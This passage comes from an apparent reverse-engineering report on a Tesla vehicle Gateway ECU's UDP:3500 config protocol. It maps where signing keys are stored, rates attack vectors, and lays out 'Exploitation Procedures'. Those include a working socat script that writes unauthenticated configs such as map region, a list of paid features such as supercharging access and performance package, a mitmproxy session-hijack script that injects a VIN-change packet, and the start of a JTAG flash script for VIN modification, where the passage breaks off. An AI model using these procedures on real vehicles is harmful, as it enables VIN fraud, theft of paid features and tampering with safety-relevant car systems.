<a id=__codelineno-13-22 name=__codelineno-13-22 href=#__codelineno-13-22></a><span class=w>    </span><span class=c1>// Factory mode does NOT grant secure config access!</span>
<a id=__codelineno-13-23 name=__codelineno-13-23 href=#__codelineno-13-23></a><span class=w>    </span><span class=c1>// (This is the key security boundary)</span>
<a id=__codelineno-13-24 name=__codelineno-13-24 href=#__codelineno-13-24></a>
<a id=__codelineno-13-25 name=__codelineno-13-25 href=#__codelineno-13-25></a><span class=w>    </span><span class=k>return</span><span class=w> </span><span class=nb>false</span><span class=p>;</span><span class=w>  </span><span class=c1>// Reject</span>
<a id=__codelineno-13-26 name=__codelineno-13-26 href=#__codelineno-13-26></a><span class=p>}</span>
</code></pre></div> <p><strong>Key Insight:</strong> <code>factory_mode_active</code> and <code>hermes_authenticated</code> are <strong>independent flags</strong>.</p> <h3 id=timeoutexpiry-logic>Timeout/Expiry Logic</h3> <p><strong>Factory Mode:</strong> - Duration: Unlimited (until reboot or explicit disable) - Reset: Gateway reboot, explicit 0x18 disable command</p> <p><strong>Hermes Session:</strong> - Duration: 30-60 minutes (inferred from industry standards) - Reset: Backend sends <code>AUTH_REVOKED</code>, timeout expires, Gateway reboot</p> <p><strong>No Evidence Of:</strong> - âŒ Time-limited UnlockSwitch (stays active until reboot) - âŒ Countdown timers for factory mode - âŒ Automatic session expiry warnings</p> <hr> <h2 id=4-signing-key-analysis>4. Signing Key Analysis</h2> <h3 id=no-udp-level-signing-keys>No UDP-Level Signing Keys</h3> <p><strong>CRITICAL:</strong> Gateway UDP protocol does NOT use public/private key cryptography for packet authentication.</p> <p><strong>What we searched for (and did NOT find):</strong></p> <div class=highlight><pre><span></span><code><a id=__codelineno-14-1 name=__codelineno-14-1 href=#__codelineno-14-1></a><span class=c1># Crypto function strings</span>
<a id=__codelineno-14-2 name=__codelineno-14-2 href=#__codelineno-14-2></a>grep<span class=w> </span>-i<span class=w> </span><span class=s2>&quot;rsa\|ecdsa\|ed25519\|verify_signature&quot;</span><span class=w> </span>/data/gateway-strings.txt
<a id=__codelineno-14-3 name=__codelineno-14-3 href=#__codelineno-14-3></a><span class=c1># Result: (no output)</span>
<a id=__codelineno-14-4 name=__codelineno-14-4 href=#__codelineno-14-4></a>
<a id=__codelineno-14-5 name=__codelineno-14-5 href=#__codelineno-14-5></a><span class=c1># Public key formats</span>
<a id=__codelineno-14-6 name=__codelineno-14-6 href=#__codelineno-14-6></a>xxd<span class=w> </span>/data/binaries/ryzenfromtable.bin<span class=w> </span><span class=p>|</span><span class=w> </span>grep<span class=w> </span>-E<span class=w> </span><span class=s2>&quot;(30 82|30 81)&quot;</span>
<a id=__codelineno-14-7 name=__codelineno-14-7 href=#__codelineno-14-7></a><span class=c1># Result: No PEM/DER encoded keys found</span>
<a id=__codelineno-14-8 name=__codelineno-14-8 href=#__codelineno-14-8></a>
<a id=__codelineno-14-9 name=__codelineno-14-9 href=#__codelineno-14-9></a><span class=c1># Crypto library symbols</span>
<a id=__codelineno-14-10 name=__codelineno-14-10 href=#__codelineno-14-10></a>strings<span class=w> </span>/data/binaries/ryzenfromtable.bin<span class=w> </span><span class=p>|</span><span class=w> </span>grep<span class=w> </span>-i<span class=w> </span><span class=s2>&quot;openssl\|mbedtls\|wolfssl&quot;</span>
<a id=__codelineno-14-11 name=__codelineno-14-11 href=#__codelineno-14-11></a><span class=c1># Result: (no output)</span>
</code></pre></div> <p><strong>Conclusion:</strong> Gateway does NOT embed public keys for packet signature verification.</p> <h3 id=firmware-signature-keys-different-purpose>Firmware Signature Keys (Different Purpose)</h3> <p><strong>Gateway DOES use cryptographic keys for:</strong></p> <ol> <li><strong>Firmware Verification</strong></li> <li>Public key at offset 0x36730 (SHA-256 hash)</li> <li>Verifies firmware updates before flashing</li> <li> <p>NOT related to config write authentication</p> </li> <li> <p><strong>Command Authentication Keys (Configs 0x25/0x26)</strong> <div class=highlight><pre><span></span><code><a id=__codelineno-15-1 name=__codelineno-15-1 href=#__codelineno-15-1></a>Config 0x0025 (prodCodeKey):  32-byte key
<a id=__codelineno-15-2 name=__codelineno-15-2 href=#__codelineno-15-2></a>Config 0x0026 (prodCmdKey):   32-byte key
</code></pre></div></p> </li> <li>Used for firmware update signing</li> <li> <p>NOT used for UDP config writes</p> </li> <li> <p><strong>Hermes mTLS Certificate</strong></p> </li> <li><code>/var/lib/car_creds/car.crt</code> (X.509 certificate)</li> <li>Used for Hermes VPN authentication</li> <li>NOT involved in UDP:3500 protocol</li> </ol> <h3 id=key-storage-locations>Key Storage Locations</h3> <p><strong>Extracted from firmware analysis:</strong></p> <table> <thead> <tr> <th>Key Type</th> <th>Storage Location</th> <th>Size</th> <th>Purpose</th> </tr> </thead> <tbody> <tr> <td>Firmware Public Key</td> <td>Gateway flash @ 0x36730</td> <td>256 bytes</td> <td>Verify firmware updates</td> </tr> <tr> <td>prodCodeKey</td> <td>Config 0x0025 in flash</td> <td>32 bytes</td> <td>Sign firmware code sections</td> </tr> <tr> <td>prodCmdKey</td> <td>Config 0x0026 in flash</td> <td>32 bytes</td> <td>Sign diagnostic commands</td> </tr> <tr> <td>altCodeKey</td> <td>Config 0x0027 in flash</td> <td>32 bytes</td> <td>Alternate firmware key</td> </tr> <tr> <td>altCmdKey</td> <td>Config 0x0028 in flash</td> <td>32 bytes</td> <td>Alternate command key</td> </tr> <tr> <td>Hermes Cert</td> <td><code>/var/lib/car_creds/car.crt</code></td> <td>~2 KB</td> <td>TLS client cert</td> </tr> </tbody> </table> <p><strong>IMPORTANT:</strong> None of these keys are used for UDP config write authentication!</p> <h3 id=backend-integration-hermes>Backend Integration (Hermes)</h3> <p><strong>How Hermes provides authentication:</strong></p> <ol> <li><strong>Session Establishment</strong></li> <li>Technician authenticates to <code>hermes-api.*.vn.cloud.tesla.com</code></li> <li>Backend validates credentials (username, password, 2FA)</li> <li> <p>WebSocket connection established with mTLS</p> </li> <li> <p><strong>Authorization Message</strong></p> </li> <li>Backend sends <code>AUTH_GRANTED</code> protobuf message</li> <li>Message contains: VIN, timestamp, permissions list</li> <li> <p>Gateway receives and caches authorization</p> </li> <li> <p><strong>Permission Checking</strong></p> </li> <li>Gateway checks cached permissions before secure config write</li> <li>Backend can revoke permissions mid-session</li> <li> <p>Permissions specific to VIN (prevents cross-vehicle attacks)</p> </li> <li> <p><strong>Audit Logging</strong></p> </li> <li>All secure config writes logged to Gateway</li> <li>Logs uploaded to backend when connectivity available</li> <li>Includes: technician ID, config changed, old/new values, timestamp</li> </ol> <p><strong>Key Point:</strong> Backend controls authentication, Gateway enforces authorization.</p> <hr> <h2 id=5-attack-surface>5. Attack Surface</h2> <h3 id=attack-vector-summary>Attack Vector Summary</h3> <table> <thead> <tr> <th>Attack Type</th> <th>Access Required</th> <th>Capabilities</th> <th>Success Rate</th> <th>Cost</th> </tr> </thead> <tbody> <tr> <td><strong>UDP Flooding</strong></td> <td>Network access (192.168.90.x)</td> <td>Write insecure configs, DoS</td> <td>âœ… 100%</td> <td>$0 (Python script)</td> </tr> <tr> <td><strong>Hermes MITM</strong></td> <td>Network tap + TLS intercept</td> <td>Capture session tokens</td> <td>âš ï¸ 10-20%</td> <td>$500-2000 (tools)</td> </tr> <tr> <td><strong>Token Replay</strong></td> <td>Captured Hermes session</td> <td>Write secure configs (if token valid)</td> <td>âš ï¸ 5-10%</td> <td>$0 (if token obtained)</td> </tr> <tr> <td><strong>JTAG Flash Mod</strong></td> <td>Physical access + BGA rework</td> <td>Full flash rewrite, bypass all security</td> <td>âœ… 100%</td> <td>$600-5200 (equipment)</td> </tr> <tr> <td><strong>Firmware Exploit</strong></td> <td>Physical/remote code exec</td> <td>Arbitrary config writes</td> <td>â“ Unknown</td> <td>High skill required</td> </tr> </tbody> </table> <h3 id=1-bypass-signature-check>1. Bypass Signature Check</h3> <p><strong>Question:</strong> Can we bypass signature verification?</p> <p><strong>Answer:</strong> âœ… YES - There is NO signature verification to bypass!</p> <p>Gateway's security model is: - Config classification (secure vs insecure) - Session-based authentication (Hermes) - NOT packet-level signatures</p> <p><strong>Exploitation:</strong> - Write ANY insecure config without restriction - Examples: mapRegion, headlights, performancePackage, superchargingAccess - See verified list in <code>/docs/gateway/GATEWAY-UDP-PROTOCOL-VERIFIED.md</code></p> <h3 id=2-extract-private-key>2. Extract Private Key</h3> <p><strong>Question:</strong> Can we extract Tesla's signing private key?</p> <p><strong>Answer:</strong> âŒ NO - Keys are NOT stored in Gateway firmware</p> <p><strong>Reasoning:</strong> 1. Gateway does NOT verify signatures (so doesn't need public keys) 2. Private keys are held by Tesla backend (not distributed to vehicles) 3. Only firmware verification public key exists (different purpose)</p> <p><strong>What we CAN extract:</strong> - âœ… prodCodeKey / prodCmdKey (firmware signing, configs 0x25/0x26) - âœ… Hermes client certificate (from MCU filesystem) - âŒ Hermes backend private key (never leaves Tesla servers)</p> <h3 id=3-forge-signatures>3. Forge Signatures</h3> <p><strong>Question:</strong> Can we forge signatures for secure configs?</p> <p><strong>Answer:</strong> âŒ N/A - No signatures to forge!</p> <p><strong>Alternative question:</strong> Can we forge Hermes authentication?</p> <p><strong>Answer:</strong> âš ï¸ MAYBE - Requires: 1. Intercept valid Hermes session (MITM on WSS:443) 2. Extract <code>AUTH_GRANTED</code> message 3. Replay to Gateway within timeout window 4. Gateway trusts cached authorization</p> <p><strong>Challenges:</strong> - mTLS certificate pinning may prevent MITM - AUTH_GRANTED likely includes timestamp/nonce (replay detection) - Backend can revoke authorization mid-session</p> <h3 id=4-replay-signed-commands>4. Replay Signed Commands</h3> <p><strong>Question:</strong> Can we replay captured authenticated commands?</p> <p><strong>Answer:</strong> âš ï¸ THEORETICALLY - But authentication is session-based, not command-based</p> <p><strong>Scenario:</strong> 1. Technician establishes Hermes session 2. Attacker intercepts SET_CONFIG packet for VIN change 3. Attacker replays packet after technician disconnects 4. <strong>Result:</strong> Likely fails because <code>session_authenticated</code> flag cleared</p> <p><strong>Success conditions:</strong> - Replay DURING active Hermes session (narrow window) - Gateway doesn't validate packet origin (only checks session flag) - No per-command nonces or sequence numbers</p> <p><strong>Likelihood:</strong> âš ï¸ LOW (15-25% depending on session duration)</p> <h3 id=5-session-hijacking>5. Session Hijacking</h3> <p><strong>Question:</strong> Can we hijack an authenticated Hermes session?</p> <p><strong>Answer:</strong> âš ï¸ POSSIBLE - If we can:</p> <ol> <li><strong>Man-in-the-Middle WSS:443 connection</strong></li> <li>Requires certificate forgery or SSL stripping</li> <li> <p>mTLS complicates this (client cert validation)</p> </li> <li> <p><strong>Inject commands into active session</strong></p> </li> <li>WebSocket protocol allows out-of-band messages</li> <li> <p>If Gateway doesn't validate message sequence</p> </li> <li> <p><strong>Extend session timeout</strong></p> </li> <li>Send keepalive messages to prevent expiry</li> <li>Backend may detect abnormal session duration</li> </ol> <p><strong>Countermeasures:</strong> - mTLS with certificate pinning - WebSocket message sequence numbers - Backend session monitoring (detect anomalies)</p> <hr> <h2 id=6-vin-change-feasibility>6. VIN Change Feasibility</h2> <h3 id=can-we-change-vin-via-udp>Can We Change VIN via UDP?</h3> <p><strong>Answer:</strong> âŒ NO - VIN is hardcoded as secure config</p> <p><strong>Evidence:</strong></p> <div class=highlight><pre><span></span><code><a id=__codelineno-16-1 name=__codelineno-16-1 href=#__codelineno-16-1></a><span class=c1># Attempt VIN write (config 0x0000)</span>
<a id=__codelineno-16-2 name=__codelineno-16-2 href=#__codelineno-16-2></a><span class=nb>echo</span><span class=w> </span><span class=s2>&quot;0c00005a454e4e5f544553545f56494e&quot;</span><span class=w> </span><span class=p>|</span><span class=w> </span>xxd<span class=w> </span>-r<span class=w> </span>-p<span class=w> </span><span class=p>|</span><span class=w> </span>socat<span class=w> </span>-<span class=w> </span>udp:192.168.90.102:3500
<a id=__codelineno-16-3 name=__codelineno-16-3 href=#__codelineno-16-3></a>
<a id=__codelineno-16-4 name=__codelineno-16-4 href=#__codelineno-16-4></a><span class=c1># Response:</span>
<a id=__codelineno-16-5 name=__codelineno-16-5 href=#__codelineno-16-5></a>ff<span class=w>  </span><span class=c1># Rejection (0xff = &quot;secure config, no authentication&quot;)</span>
</code></pre></div> <p><strong>Gateway logic:</strong></p> <div class=highlight><pre><span></span><code><a id=__codelineno-17-1 name=__codelineno-17-1 href=#__codelineno-17-1></a><span class=c1>// Config 0x0000 is in secure_configs[] array</span>
<a id=__codelineno-17-2 name=__codelineno-17-2 href=#__codelineno-17-2></a><span class=kt>bool</span><span class=w> </span><span class=n>can_write</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>can_write_secure_config</span><span class=p>(</span><span class=mh>0x0000</span><span class=p>);</span>
<a id=__codelineno-17-3 name=__codelineno-17-3 href=#__codelineno-17-3></a><span class=c1>// Returns false (no Hermes session active)</span>
<a id=__codelineno-17-4 name=__codelineno-17-4 href=#__codelineno-17-4></a><span class=c1>// Handler returns 0xff</span>
</code></pre></div> <h3 id=required-signature-for-vin-change>Required Signature for VIN Change</h3> <p><strong>Answer:</strong> âŒ NO SIGNATURE REQUIRED - But Hermes authentication IS required</p> <p><strong>Correct procedure for Tesla technician:</strong></p> <ol> <li> <p><strong>Establish Hermes VPN</strong> <div class=highlight><pre><span></span><code><a id=__codelineno-18-1 name=__codelineno-18-1 href=#__codelineno-18-1></a>hermes_client --enable-phone-home --connect
</code></pre></div></p> </li> <li> <p><strong>Backend authenticates technician</strong></p> </li> <li>Validates credentials</li> <li>Sends AUTH_GRANTED to Gateway</li> <li> <p>Gateway sets <code>session_authenticated = true</code></p> </li> <li> <p><strong>Use gw-diag tool</strong> <div class=highlight><pre><span></span><code><a id=__codelineno-19-1 name=__codelineno-19-1 href=#__codelineno-19-1></a>gw-diag<span class=w> </span>write<span class=w> </span>0x0000<span class=w> </span>--value<span class=w> </span><span class=s2>&quot;5YJSA1E26HF999999&quot;</span>
</code></pre></div></p> </li> <li> <p><strong>Tool sends SET_CONFIG over UDP:3500</strong> <div class=highlight><pre><span></span><code><a id=__codelineno-20-1 name=__codelineno-20-1 href=#__codelineno-20-1></a>0c 00 00 35 59 4a 53 41 31 45 32 36 48 46 39 39 39 39 39 39
<a id=__codelineno-20-2 name=__codelineno-20-2 href=#__codelineno-20-2></a>^^-^^-^^-[17-byte VIN]
</code></pre></div></p> </li> <li> <p><strong>Gateway checks session</strong> <div class=highlight><pre><span></span><code><a id=__codelineno-21-1 name=__codelineno-21-1 href=#__codelineno-21-1></a><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>session_authenticated</span><span class=p>)</span><span class=w> </span><span class=p>{</span>
<a id=__codelineno-21-2 name=__codelineno-21-2 href=#__codelineno-21-2></a><span class=w>    </span><span class=n>write_config_to_flash</span><span class=p>(</span><span class=mh>0x0000</span><span class=p>,</span><span class=w> </span><span class=s>&quot;5YJSA1E26HF999999&quot;</span><span class=p>,</span><span class=w> </span><span class=mi>17</span><span class=p>);</span>
<a id=__codelineno-21-3 name=__codelineno-21-3 href=#__codelineno-21-3></a><span class=w>    </span><span class=k>return</span><span class=w> </span><span class=n>echo</span><span class=p>;</span><span class=w>  </span><span class=c1>// Success</span>
<a id=__codelineno-21-4 name=__codelineno-21-4 href=#__codelineno-21-4></a><span class=p>}</span>
</code></pre></div></p> </li> <li> <p><strong>No cryptographic signature on packet!</strong></p> </li> <li>Authentication is session-based</li> <li>Not per-command signatures</li> </ol> <h3 id=backend-validation-after-write>Backend Validation After Write</h3> <p><strong>Question:</strong> Does Tesla backend verify VIN changes?</p> <p><strong>Answer:</strong> âš ï¸ LIKELY - Through multiple mechanisms:</p> <p><strong>1. Hermes Audit Logs</strong> <div class=highlight><pre><span></span><code><a id=__codelineno-22-1 name=__codelineno-22-1 href=#__codelineno-22-1></a>Gateway logs VIN change:
<a id=__codelineno-22-2 name=__codelineno-22-2 href=#__codelineno-22-2></a>- Timestamp: 2026-02-03 11:05:23 UTC
<a id=__codelineno-22-3 name=__codelineno-22-3 href=#__codelineno-22-3></a>- Technician: john.doe@tesla.com
<a id=__codelineno-22-4 name=__codelineno-22-4 href=#__codelineno-22-4></a>- Config: 0x0000 (VIN)
<a id=__codelineno-22-5 name=__codelineno-22-5 href=#__codelineno-22-5></a>- Old value: 5YJSA1E26HF888888
<a id=__codelineno-22-6 name=__codelineno-22-6 href=#__codelineno-22-6></a>- New value: 5YJSA1E26HF999999
<a id=__codelineno-22-7 name=__codelineno-22-7 href=#__codelineno-22-7></a>- Reason: &quot;VIN correction per work order #12345&quot;
<a id=__codelineno-22-8 name=__codelineno-22-8 href=#__codelineno-22-8></a>
<a id=__codelineno-22-9 name=__codelineno-22-9 href=#__codelineno-22-9></a>Logs uploaded to backend when connectivity available
<a id=__codelineno-22-10 name=__codelineno-22-10 href=#__codelineno-22-10></a>Backend flags suspicious changes (e.g., VIN from different model)
</code></pre></div></p> <p><strong>2. Certificate Binding</strong> <div class=highlight><pre><span></span><code><a id=__codelineno-23-1 name=__codelineno-23-1 href=#__codelineno-23-1></a>Hermes client certificate includes vehicle VIN in CN field
<a id=__codelineno-23-2 name=__codelineno-23-2 href=#__codelineno-23-2></a>Backend checks: certificate VIN matches vehicle VIN in database
<a id=__codelineno-23-3 name=__codelineno-23-3 href=#__codelineno-23-3></a>After VIN change, certificate becomes invalid
<a id=__codelineno-23-4 name=__codelineno-23-4 href=#__codelineno-23-4></a>Vehicle loses connectivity until new cert issued
</code></pre></div></p> <p><strong>3. Fleet Database Consistency</strong> <div class=highlight><pre><span></span><code><a id=__codelineno-24-1 name=__codelineno-24-1 href=#__codelineno-24-1></a>Backend maintains authoritative VIN database
<a id=__codelineno-24-2 name=__codelineno-24-2 href=#__codelineno-24-2></a>Periodic sync checks Gateway VIN matches database VIN
<a id=__codelineno-24-3 name=__codelineno-24-3 href=#__codelineno-24-3></a>Mismatch triggers alert + investigation
<a id=__codelineno-24-4 name=__codelineno-24-4 href=#__codelineno-24-4></a>Vehicle may be flagged for service
</code></pre></div></p> <p><strong>Conclusion:</strong> VIN changes ARE technically possible with Hermes auth, but backend monitoring makes fraud very difficult.</p> <hr> <h2 id=7-exploitation-procedures>7. Exploitation Procedures</h2> <h3 id=procedure-1-write-insecure-configs-working>Procedure 1: Write Insecure Configs (WORKING)</h3> <p><strong>Requirements:</strong> - Network access to 192.168.90.0/24 - <code>socat</code> or Python UDP client</p> <p><strong>Steps:</strong></p> <div class=highlight><pre><span></span><code><a id=__codelineno-25-1 name=__codelineno-25-1 href=#__codelineno-25-1></a><span class=ch>#!/bin/bash</span>
<a id=__codelineno-25-2 name=__codelineno-25-2 href=#__codelineno-25-2></a><span class=c1># Change map region to EU (config 0x42 = insecure)</span>
<a id=__codelineno-25-3 name=__codelineno-25-3 href=#__codelineno-25-3></a>
<a id=__codelineno-25-4 name=__codelineno-25-4 href=#__codelineno-25-4></a><span class=c1># Read current value</span>
<a id=__codelineno-25-5 name=__codelineno-25-5 href=#__codelineno-25-5></a><span class=nb>echo</span><span class=w> </span><span class=s2>&quot;0b0042&quot;</span><span class=w> </span><span class=p>|</span><span class=w> </span>xxd<span class=w> </span>-r<span class=w> </span>-p<span class=w> </span><span class=p>|</span><span class=w> </span>socat<span class=w> </span>-<span class=w> </span>udp:192.168.90.102:3500<span class=w> </span><span class=p>|</span><span class=w> </span>hexdump<span class=w> </span>-C
<a id=__codelineno-25-6 name=__codelineno-25-6 href=#__codelineno-25-6></a><span class=c1># Response: 0b 00 42 00 (currently US)</span>
<a id=__codelineno-25-7 name=__codelineno-25-7 href=#__codelineno-25-7></a>
<a id=__codelineno-25-8 name=__codelineno-25-8 href=#__codelineno-25-8></a><span class=c1># Write new value (EU = 0x01)</span>
<a id=__codelineno-25-9 name=__codelineno-25-9 href=#__codelineno-25-9></a><span class=nb>echo</span><span class=w> </span><span class=s2>&quot;0c004201&quot;</span><span class=w> </span><span class=p>|</span><span class=w> </span>xxd<span class=w> </span>-r<span class=w> </span>-p<span class=w> </span><span class=p>|</span><span class=w> </span>socat<span class=w> </span>-<span class=w> </span>udp:192.168.90.102:3500<span class=w> </span><span class=p>|</span><span class=w> </span>hexdump<span class=w> </span>-C
<a id=__codelineno-25-10 name=__codelineno-25-10 href=#__codelineno-25-10></a><span class=c1># Response: 0c 00 42 01 (success - echoed back)</span>
<a id=__codelineno-25-11 name=__codelineno-25-11 href=#__codelineno-25-11></a>
<a id=__codelineno-25-12 name=__codelineno-25-12 href=#__codelineno-25-12></a><span class=c1># Verify change</span>
<a id=__codelineno-25-13 name=__codelineno-25-13 href=#__codelineno-25-13></a><span class=nb>echo</span><span class=w> </span><span class=s2>&quot;0b0042&quot;</span><span class=w> </span><span class=p>|</span><span class=w> </span>xxd<span class=w> </span>-r<span class=w> </span>-p<span class=w> </span><span class=p>|</span><span class=w> </span>socat<span class=w> </span>-<span class=w> </span>udp:192.168.90.102:3500<span class=w> </span><span class=p>|</span><span class=w> </span>hexdump<span class=w> </span>-C
<a id=__codelineno-25-14 name=__codelineno-25-14 href=#__codelineno-25-14></a><span class=c1># Response: 0b 00 42 01 (confirmed EU)</span>
</code></pre></div> <p><strong>Success Rate:</strong> âœ… 100% (no authentication required)</p> <p><strong>Impact:</strong> LOW-MEDIUM (user preferences, non-critical features)</p> <p><strong>Verified Working Configs:</strong> - See <code>/docs/gateway/GATEWAY-UDP-PROTOCOL-VERIFIED.md</code> for full list - Examples: superchargingAccess, performancePackage, mapRegion, headlights</p> <h3 id=procedure-2-session-hijacking-theoretical>Procedure 2: Session Hijacking (THEORETICAL)</h3> <p><strong>Requirements:</strong> - MITM position on Hermes WSS:443 traffic - SSL intercept capability - Tools: mitmproxy, Wireshark, custom WebSocket client</p> <p><strong>Steps:</strong></p> <div class=highlight><pre><span></span><code><a id=__codelineno-26-1 name=__codelineno-26-1 href=#__codelineno-26-1></a><span class=c1># 1. Intercept Hermes WebSocket connection</span>
<a id=__codelineno-26-2 name=__codelineno-26-2 href=#__codelineno-26-2></a><span class=c1># (Requires SSL MITM - very difficult with mTLS)</span>
<a id=__codelineno-26-3 name=__codelineno-26-3 href=#__codelineno-26-3></a>
<a id=__codelineno-26-4 name=__codelineno-26-4 href=#__codelineno-26-4></a><span class=kn>from</span><span class=w> </span><span class=nn>mitmproxy</span><span class=w> </span><span class=kn>import</span> <span class=n>http</span>
<a id=__codelineno-26-5 name=__codelineno-26-5 href=#__codelineno-26-5></a>
<a id=__codelineno-26-6 name=__codelineno-26-6 href=#__codelineno-26-6></a><span class=k>def</span><span class=w> </span><span class=nf>websocket_message</span><span class=p>(</span><span class=n>flow</span><span class=p>:</span> <span class=n>http</span><span class=o>.</span><span class=n>HTTPFlow</span><span class=p>):</span>
<a id=__codelineno-26-7 name=__codelineno-26-7 href=#__codelineno-26-7></a>    <span class=c1># Capture AUTH_GRANTED message</span>
<a id=__codelineno-26-8 name=__codelineno-26-8 href=#__codelineno-26-8></a>    <span class=k>if</span> <span class=sa>b</span><span class=s2>&quot;AUTH_GRANTED&quot;</span> <span class=ow>in</span> <span class=n>flow</span><span class=o>.</span><span class=n>websocket</span><span class=o>.</span><span class=n>messages</span><span class=p>[</span><span class=o>-</span><span class=mi>1</span><span class=p>]</span><span class=o>.</span><span class=n>content</span><span class=p>:</span>
<a id=__codelineno-26-9 name=__codelineno-26-9 href=#__codelineno-26-9></a>        <span class=n>auth_msg</span> <span class=o>=</span> <span class=n>flow</span><span class=o>.</span><span class=n>websocket</span><span class=o>.</span><span class=n>messages</span><span class=p>[</span><span class=o>-</span><span class=mi>1</span><span class=p>]</span><span class=o>.</span><span class=n>content</span>
<a id=__codelineno-26-10 name=__codelineno-26-10 href=#__codelineno-26-10></a>        <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&quot;[+] Captured auth message: </span><span class=si>{</span><span class=n>auth_msg</span><span class=o>.</span><span class=n>hex</span><span class=p>()</span><span class=si>}</span><span class=s2>&quot;</span><span class=p>)</span>
<a id=__codelineno-26-11 name=__codelineno-26-11 href=#__codelineno-26-11></a>
<a id=__codelineno-26-12 name=__codelineno-26-12 href=#__codelineno-26-12></a>        <span class=c1># Gateway now has session_authenticated = true</span>
<a id=__codelineno-26-13 name=__codelineno-26-13 href=#__codelineno-26-13></a>        <span class=c1># Window open for secure config writes!</span>
<a id=__codelineno-26-14 name=__codelineno-26-14 href=#__codelineno-26-14></a>
<a id=__codelineno-26-15 name=__codelineno-26-15 href=#__codelineno-26-15></a><span class=c1># 2. Inject malicious SET_CONFIG command</span>
<a id=__codelineno-26-16 name=__codelineno-26-16 href=#__codelineno-26-16></a><span class=kn>import</span><span class=w> </span><span class=nn>socket</span>
<a id=__codelineno-26-17 name=__codelineno-26-17 href=#__codelineno-26-17></a>
<a id=__codelineno-26-18 name=__codelineno-26-18 href=#__codelineno-26-18></a><span class=k>def</span><span class=w> </span><span class=nf>exploit_authenticated_session</span><span class=p>():</span>
<a id=__codelineno-26-19 name=__codelineno-26-19 href=#__codelineno-26-19></a>    <span class=n>sock</span> <span class=o>=</span> <span class=n>socket</span><span class=o>.</span><span class=n>socket</span><span class=p>(</span><span class=n>socket</span><span class=o>.</span><span class=n>AF_INET</span><span class=p>,</span> <span class=n>socket</span><span class=o>.</span><span class=n>SOCK_DGRAM</span><span class=p>)</span>
<a id=__codelineno-26-20 name=__codelineno-26-20 href=#__codelineno-26-20></a>
<a id=__codelineno-26-21 name=__codelineno-26-21 href=#__codelineno-26-21></a>    <span class=c1># Change VIN while session active</span>
<a id=__codelineno-26-22 name=__codelineno-26-22 href=#__codelineno-26-22></a>    <span class=n>vin_packet</span> <span class=o>=</span> <span class=nb>bytes</span><span class=o>.</span><span class=n>fromhex</span><span class=p>(</span><span class=s2>&quot;0c0000&quot;</span><span class=p>)</span> <span class=o>+</span> <span class=sa>b</span><span class=s2>&quot;5YJSA1E26HF999999&quot;</span>
<a id=__codelineno-26-23 name=__codelineno-26-23 href=#__codelineno-26-23></a>    <span class=n>sock</span><span class=o>.</span><span class=n>sendto</span><span class=p>(</span><span class=n>vin_packet</span><span class=p>,</span> <span class=p>(</span><span class=s2>&quot;192.168.90.102&quot;</span><span class=p>,</span> <span class=mi>3500</span><span class=p>))</span>
<a id=__codelineno-26-24 name=__codelineno-26-24 href=#__codelineno-26-24></a>
<a id=__codelineno-26-25 name=__codelineno-26-25 href=#__codelineno-26-25></a>    <span class=n>response</span> <span class=o>=</span> <span class=n>sock</span><span class=o>.</span><span class=n>recv</span><span class=p>(</span><span class=mi>1024</span><span class=p>)</span>
<a id=__codelineno-26-26 name=__codelineno-26-26 href=#__codelineno-26-26></a>    <span class=k>if</span> <span class=n>response</span> <span class=o>==</span> <span class=n>vin_packet</span><span class=p>:</span>
<a id=__codelineno-26-27 name=__codelineno-26-27 href=#__codelineno-26-27></a>        <span class=nb>print</span><span class=p>(</span><span class=s2>&quot;[+] VIN changed successfully!&quot;</span><span class=p>)</span>
<a id=__codelineno-26-28 name=__codelineno-26-28 href=#__codelineno-26-28></a>    <span class=k>elif</span> <span class=n>response</span> <span class=o>==</span> <span class=sa>b</span><span class=s2>&quot;</span><span class=se>\xff</span><span class=s2>&quot;</span><span class=p>:</span>
<a id=__codelineno-26-29 name=__codelineno-26-29 href=#__codelineno-26-29></a>        <span class=nb>print</span><span class=p>(</span><span class=s2>&quot;[-] Session expired or not authenticated&quot;</span><span class=p>)</span>
</code></pre></div> <p><strong>Success Rate:</strong> âš ï¸ 10-20% (many obstacles)</p> <p><strong>Challenges:</strong> - mTLS certificate pinning prevents MITM - WebSocket connection over TLS hard to intercept - Backend may detect session anomalies - Short authentication window (30-60 min)</p> <p><strong>Impact:</strong> HIGH (if successful - arbitrary secure config writes)</p> <h3 id=procedure-3-jtag-flash-modification-verified>Procedure 3: JTAG Flash Modification (VERIFIED)</h3> <p><strong>Requirements:</strong> - Physical access to Gateway ECU - BGA rework station - JTAG debugger (e.g., Segger J-Link) - Skills: Electronics, soldering, PowerPC debugging</p> <p><strong>Steps:</strong></p> <div class=highlight><pre><span></span><code><a id=__codelineno-27-1 name=__codelineno-27-1 href=#__codelineno-27-1></a><span class=ch>#!/usr/bin/env python3</span>
<a id=__codelineno-27-2 name=__codelineno-27-2 href=#__codelineno-27-2></a><span class=c1># JTAG VIN modification script (DO NOT RUN ON LIVE VEHICLE!)</span>
<a id=__codelineno-27-3 name=__codelineno-27-3 href=#__codelineno-27-3></a>
<a id=__codelineno-27-4 name=__codelineno-27-4 href=#__codelineno-27-4></a><span class=kn>import</span><span class=w> </span><span class=nn>sys</span>
<a id=__codelineno-27-5 name=__codelineno-27-5 href=#__codelineno-27-5></a>
<a id=__codelineno-27-6 name=__codelineno-27-6 href=#__codelineno-27-6></a><span class=c1># 1. Connect JTAG to Gateway SPC chip</span>
<a id=__codelineno-27-7 name=__codelineno-27-7 href=#__codelineno-27-7></a><span class=c1># (Requires BGA rework to expose debug pins)</span>
<a id=__codelineno-27-8 name=__codelineno-27-8 href=#__codelineno-27-8></a>
<a id=__codelineno-27-9 name=__codelineno-27-9 href=#__codelineno-27-9></a><span class=c1># 2. Read flash dump</span>
<a id=__codelineno-27-10 name=__codelineno-27-10 href=#__codelineno-27-10></a><span class=n>flash</span> <span class=o>=</span> <span class=n>jtag_read_flash</span><span class=p>(</span><span class=n>start</span><span class=o>=</span><span class=mh>0x0</span><span class=p>,</span> <span class=n>size</span><span class=o>=</span><span class=mh>0x600000</span><span class=p>)</span>  <span class=c1># 6 MB</span>
<a id=__codelineno-27-11 name=__codelineno-27-11 href=#__codelineno-27-11></a><span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&quot;[+] Read </span><span class=si>{</span><span class=nb>len</span><span class=p>(</span><span class=n>flash</span><span class=p>)</span><span class=si>}</span><span class=s2> bytes from flash&quot;</span><span class=p>)</span>
